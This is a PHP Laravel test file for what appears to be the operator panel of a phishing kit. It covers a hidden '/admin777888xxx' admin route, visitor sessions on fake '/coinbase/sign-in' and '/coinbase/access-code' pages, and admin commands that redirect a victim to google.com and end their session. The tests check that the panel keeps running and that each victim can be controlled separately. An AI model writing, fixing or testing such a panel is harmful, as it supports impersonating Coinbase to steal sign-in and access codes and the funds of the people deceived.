<?php

namespace Tests\Feature;

use App\Models\AdminCommand;
use App\Models\UserSession;
use App\Services\LiveledSettings;
use Illuminate\Foundation\Http\Middleware\ValidateCsrfToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Routing\Middleware\ThrottleRequests;
use Illuminate\Support\Str;
use Tests\TestCase;

class AdminKickPingRedirectTest extends TestCase
{
    use RefreshDatabase;

    private const SHARED_IP = '203.0.113.10';
    private const EXIT_URL = 'https://google.com';
    private const KEEP_ENTRY = '/coinbase/access-code';

    private string $entryFile;

    private ?string $entryBackup = null;

    protected function setUp(): void
    {
        parent::setUp();
        $this->withoutMiddleware([
            ThrottleRequests::class,
            ValidateCsrfToken::class,
        ]);
        $this->entryFile = storage_path('app/entry_page.txt');
        $this->entryBackup = is_file($this->entryFile) ? file_get_contents($this->entryFile) : null;
    }

    protected function tearDown(): void
    {
        if ($this->entryBackup === null) {
            if (is_file($this->entryFile)) {
                @unlink($this->entryFile);
            }
        } else {
            file_put_contents($this->entryFile, $this->entryBackup, LOCK_EX);
        }
        parent::tearDown();
    }

    public function test_kick_ping_script_sends_auth_loss_to_admin_login_not_google(): void
    {
        $js = file_get_contents(public_path('js/admin-dashboard.js'));
        $this->assertNotFalse($js);

        $start = strpos($js, 'function _kickPing()');
        $this->assertNotFalse($start);
        $end = strpos($js, 'setInterval(_kickPing, 5000);', $start);
        $this->assertNotFalse($end);
        $block = substr($js, $start, $end - $start);

        $this->assertStringContainsString("window.location.replace('/admin777888xxx/login')", $block);
        $this->assertStringNotContainsString('google.com', $block);
        $this->assertStringNotContainsString('https://www.google.com', $block);
    }

    public function test_authenticated_admin_ping_is_ok(): void
    {
        $this->withSession(['admin_auth' => true, 'admin_role' => 'master'])
            ->withHeaders(['X-Requested-With' => 'XMLHttpRequest'])
            ->get('/admin777888xxx/ping')
            ->assertOk()
            ->assertJson(['ok' => true]);
    }

    public function test_admin_auth_loss_returns_login_not_google(): void
    {
        $this->get('/admin777888xxx/ping')
            ->assertRedirect(route('admin.login'));

        $xhr = $this->withHeaders([
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json',
        ])->get('/admin777888xxx/ping');

        $xhr->assertStatus(401)
            ->assertJsonPath('error', 'Unauthenticated')
            ->assertJsonPath('redirect', route('admin.login'));
        $this->assertStringNotContainsString('google.com', $xhr->getContent());
    }

    public function test_exiting_visitor_a_does_not_navigate_admin_and_leaves_b_independent(): void
    {
        LiveledSettings::set('session_exit_url', self::EXIT_URL);
        LiveledSettings::setEntryPage(self::KEEP_ENTRY);

        $tokenA = $this->token();
        $tokenB = $this->token();
        $this->makeVisitor($tokenA);
        $this->makeVisitor($tokenB);

        $this->withSession(['admin_auth' => true, 'admin_role' => 'master'])
            ->withServerVariables(['REMOTE_ADDR' => self::SHARED_IP])
            ->delete('/admin777888xxx/session/'.$tokenA)
            ->assertOk()
            ->assertJson(['ok' => true]);

        $this->withSession(['admin_auth' => true, 'admin_role' => 'master'])
            ->withServerVariables(['REMOTE_ADDR' => self::SHARED_IP])
            ->withHeaders(['X-Requested-With' => 'XMLHttpRequest'])
            ->get('/admin777888xxx/ping')
            ->assertOk()
            ->assertJson(['ok' => true]);

        $this->defaultHeaders = [];

        $dash = $this->withSession(['admin_auth' => true, 'admin_role' => 'master'])
            ->withServerVariables(['REMOTE_ADDR' => self::SHARED_IP])
            ->get('/admin777888xxx/');
        $dash->assertOk();
        $this->assertStringNotContainsString('https://www.google.com', $dash->getContent());

        $this->assertNull(UserSession::where('session_token', $tokenA)->first());
        $this->assertNotNull(UserSession::where('session_token', $tokenB)->first());

        $this->assertSame(1, AdminCommand::where('session_token', $tokenA)
            ->where('command', 'redirect')
            ->count());
        $this->assertSame(0, AdminCommand::where('session_token', $tokenB)
            ->where('command', 'redirect')
            ->count());

        $cmdA = $this->withCookie('liveled_token', $tokenA)->get('/api/check')->assertOk()->json();
        $this->assertSame('redirect', $cmdA['commands'][0]['command'] ?? null);
        $this->assertSame(self::EXIT_URL, $cmdA['commands'][0]['payload']['url'] ?? null);
        $this->assertTrue((bool) ($cmdA['commands'][0]['payload']['end_session'] ?? false));

        $cmdB = $this->withCookie('liveled_token', $tokenB)->get('/api/check')->assertOk()->json();
        $this->assertSame([], $cmdB['commands']);

        $this->withCookie('liveled_token', $tokenA)
            ->get('/coinbase/sign-in')
            ->assertRedirect(self::EXIT_URL);

        $this->withCookie('liveled_token', $tokenB)
            ->get('/coinbase/sign-in')
            ->assertOk();
    }

    private function token(): string
    {
        return Str::random(48);
    }

    private function makeVisitor(string $token): UserSession
    {
        return UserSession::create([
            'session_token' => $token,
            'ip_address' => self::SHARED_IP,
            'user_agent' => 'InspectAgent',
            'current_page' => 'coinbase_access_code',
            'last_seen_at' => now(),
        ]);
    }
}
